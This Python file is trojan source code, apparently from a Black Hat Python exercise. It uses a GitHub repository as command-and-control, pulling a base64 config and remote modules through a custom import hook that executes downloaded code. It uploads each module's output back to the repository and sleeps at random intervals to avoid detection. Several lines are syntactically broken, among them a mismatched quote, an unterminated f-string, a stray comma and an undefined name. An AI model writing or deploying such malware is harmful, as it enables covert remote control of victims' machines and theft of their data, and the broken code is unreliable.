import base64
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime

import github3


def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'tiarno" # The username for your github.
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan') # Replace bhptrojan with the name of your repo.

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/' # Writes output files to a directory named after its ID.
        self.repo = github_connect()

    def get_config(self): # Retrieves the remote configuration document from the repo.
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module): # Calls the run function of the module.
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data): # Creates an output file which includes the ID, date and time.
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self): # Executes the tasks defined in the config. Pushes the data retrieve from the task to github.
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1,10))

            time.sleep(random.randint(30*6, 3*60*60)) # Sleeps for a random period to try and avoid pattern detection.

class GitImporter: # Used whenever the interpreter attempts to load a module that isn't available.
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None): # Attempts to locate the module in our repo.
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library) # GitHub gives us encoded data, so we decode it for use.
            return self

    def load_module(self, name): # Create a blank module object then write in the module code we retrieved from GitHub.
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self,.current_module_code, new_module.__dict__)
        sys.modules[spec_name] = new_module
        return new_module
